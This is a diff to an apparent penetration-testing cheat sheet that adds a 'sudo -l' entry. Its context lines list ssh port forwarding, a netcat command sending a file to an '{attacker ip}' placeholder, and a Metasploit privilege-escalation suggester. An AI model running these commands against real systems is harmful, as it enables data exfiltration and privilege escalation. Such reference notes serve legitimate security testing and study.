@@ -24,6 +24,7 @@
 * `ssh -L {localport}:localhost:{remoteport} {user}@{remoteip}` _Forward a port through ssh_
 * `nc -w 3 {attacker ip} {port} < {filename}` _Send file with netcat_
 * `nc -l -p {listen port} > {filename}` _Receive file with netcat_
+* `sudo -l` _Show commands that can be run as sudo_
 
 ## Pric Esc Generic
 * `run post/multi/recon/local_exploit_suggester` _Check for local priv esc exploits.  Must be interacting with meterpreter session_
